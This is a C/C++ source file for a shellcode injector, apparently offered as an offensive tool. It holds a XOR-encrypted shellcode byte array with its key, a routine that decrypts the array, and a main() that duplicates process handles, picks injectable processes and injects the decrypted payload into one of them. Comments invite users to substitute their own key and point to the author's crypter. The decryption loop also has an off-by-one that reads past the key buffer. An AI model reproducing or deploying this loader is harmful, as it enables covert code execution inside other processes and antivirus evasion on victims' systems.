#include "ProcHandler.h"


//You can change this key depending on the one you used to encrypt the payload
unsigned char key[] = {
    0x04, 0x05, 0x06, 0x07, 0x08, 0x09,0x02,0x01
};







//I've use a custom Crypter to generate my shellcode, which you can find on my GitHub
unsigned char  shellcode[] = {
        0x56, 0x4D, 0x37, 0xD5, 0x59, 0x5F, 0x67, 0x49, 0x8B, 0x56, 0x65, 0x4E, 0x8C, 0x5A, 0x11, 0x4A,
        0x8A, 0x52, 0x24, 0x4D, 0x8D, 0x75, 0x58, 0x41, 0x0D, 0xB6, 0x4A, 0x4E, 0x48, 0x37, 0xCE, 0x40,
        0x38, 0xC2, 0xAD, 0x3C, 0x65, 0x79, 0x04, 0x2B, 0x28, 0x48, 0xC3, 0xC8, 0x0D, 0x45, 0x04, 0xC7,
        0xE5, 0xE5, 0x5B, 0x43, 0x50, 0x48, 0x8F, 0x57, 0x26, 0x8C, 0x4A, 0x35, 0x4A, 0x00, 0xD0, 0x62,
        0x84, 0x7E, 0x1F, 0x03, 0x0B, 0x0D, 0x84, 0x72, 0x04, 0x05, 0x06, 0x8C, 0x88, 0x81, 0x02, 0x01,
        0x00, 0x4C, 0x80, 0xC6, 0x73, 0x6F, 0x41, 0x03, 0xD1, 0x50, 0x40, 0x8E, 0x46, 0x27, 0x83, 0x41,
        0x1A, 0x48, 0x01, 0xD4, 0xE6, 0x50, 0x4F, 0xF7, 0xC0, 0x4F, 0x30, 0xC9, 0x45, 0x8E, 0x32, 0x8F,
        0x40, 0x08, 0xD4, 0x49, 0x31, 0xC4, 0xA9, 0x47, 0xC6, 0xC1, 0x04, 0x43, 0x00, 0xC1, 0x3C, 0xE5,
        0x73, 0xF6, 0x44, 0x0A, 0x4E, 0x25, 0x08, 0x41, 0x3C, 0xD7, 0x72, 0xD0, 0x51, 0x46, 0x8A, 0x40,
        0x20, 0x4C, 0x07, 0xD7, 0x6E, 0x48, 0x89, 0x0D, 0x48, 0x40, 0x8E, 0x46, 0x1B, 0x41, 0x08, 0xD2,
        0x40, 0x8B, 0x00, 0x8D, 0x47, 0x5F, 0x40, 0x08, 0xD2, 0x40, 0x58, 0x5A, 0x5C, 0x5C, 0x46, 0x50,
        0x48, 0x5B, 0x40, 0x5A, 0x4C, 0x86, 0xEA, 0x27, 0x49, 0x5B, 0xFD, 0xE1, 0x58, 0x45, 0x5C, 0x5C,
        0x4F, 0x83, 0x1B, 0xEB, 0x4A, 0xFF, 0xFB, 0xFA, 0x5B, 0x4E, 0xB6, 0x7E, 0x71, 0x33, 0x5F, 0x37,
        0x37, 0x06, 0x07, 0x49, 0x5F, 0x4B, 0x88, 0xE6, 0x4C, 0x84, 0xEA, 0xA7, 0x09, 0x09, 0x02, 0x48,
        0x89, 0xE1, 0x4C, 0xBA, 0x05, 0x08, 0x29, 0xF9, 0xC1, 0xA8, 0x22, 0x85, 0x47, 0x53, 0x41, 0x80,
        0xE6, 0x4D, 0x89, 0xF5, 0x44, 0xBC, 0x4B, 0x7F, 0x2F, 0x05, 0xFE, 0xD5, 0x48, 0x8C, 0xEC, 0x6F,
        0x09, 0x08, 0x02, 0x01, 0x59, 0x45, 0xBF, 0x2F, 0x87, 0x63, 0x09, 0xFD, 0xD4, 0x6A, 0x0E, 0x44,
        0x58, 0x57, 0x58, 0x44, 0x33, 0xC8, 0x4D, 0x35, 0xC5, 0x4E, 0xF8, 0xC8, 0x41, 0x8B, 0xC3, 0x48,
        0xFB, 0xC5, 0x4E, 0x8E, 0xC9, 0x48, 0xB8, 0xEB, 0x0F, 0xDB, 0xE5, 0xF9, 0xD2, 0x40, 0x80, 0xC5,
        0x6B, 0x10, 0x45, 0x5D, 0x4A, 0x8E, 0xEA, 0x41, 0x8B, 0xF8, 0x41, 0xBE, 0x9C, 0xA3, 0x73, 0x69,
        0xF6, 0xD7, 0x84, 0xC0, 0x70, 0x0F, 0x4F, 0xF8, 0xC6, 0x7C, 0xE7, 0xE9, 0x93, 0x04, 0x05, 0x06,
        0x4F, 0x8B, 0xE5, 0x12, 0x49, 0x89, 0xE6, 0x48, 0x37, 0xCE, 0x62, 0x0D, 0x43, 0x59, 0x48, 0x8D,
        0xFC, 0x47, 0xBD, 0x0A, 0xD0, 0xCA, 0x5E, 0xFF, 0xD1, 0x86, 0xFE, 0x07, 0x76, 0x5C, 0x4A, 0x82,
        0xC4, 0x24, 0x5B, 0x8F, 0xF1, 0x62, 0x49, 0x43, 0x58, 0x68, 0x04, 0x15, 0x06, 0x07, 0x49, 0x51,
        0x4A, 0x88, 0xF2, 0x4C, 0x34, 0xCF, 0x46, 0xB2, 0x51, 0xA6, 0x52, 0xE5, 0xFB, 0xD0, 0x4E, 0x8E,
        0xCB, 0x40, 0x8B, 0xC6, 0x4D, 0x35, 0xCC, 0x4F, 0x8E, 0xF8, 0x41, 0x8B, 0xDB, 0x48, 0x8D, 0xFC,
        0x47, 0xBD, 0x0A, 0xD0, 0xCA, 0x5E, 0xFF, 0xD1, 0x86, 0xFE, 0x07, 0x75, 0x21, 0x5A, 0x40, 0x57,
        0x5D, 0x6D, 0x06, 0x47, 0x08, 0x09, 0x43, 0x59, 0x6A, 0x04, 0x5F, 0x47, 0xBD, 0x03, 0x26, 0x0D,
        0x31, 0xFF, 0xD1, 0x52, 0x5F, 0x46, 0xB2, 0x7C, 0x6C, 0x4C, 0x61, 0xFB, 0xD0, 0x4F, 0xF8, 0xC6,
        0xE0, 0x3E, 0xFE, 0xFF, 0xFB, 0x4D, 0x07, 0xC4, 0x40, 0x20, 0xC4, 0x49, 0x85, 0xF2, 0x70, 0xB2,
        0x46, 0xF7, 0xEE, 0x5A, 0x6B, 0x00, 0x5D, 0x4C, 0xC1, 0xC5, 0xF8, 0xBC, 0xA0, 0x57, 0xFF, 0xD1,
        0x05 };

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize)
{
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize)
        {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}


int main() {
    PVOID mAddress;
    std::deque<Process_Info> processesInfo;

    GetProcessesAndDuplicate(processesInfo);
    FindInjectableProcesses(processesInfo);
    XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));
    InjectShellcodeIntoProcess(processesInfo, shellcode);
}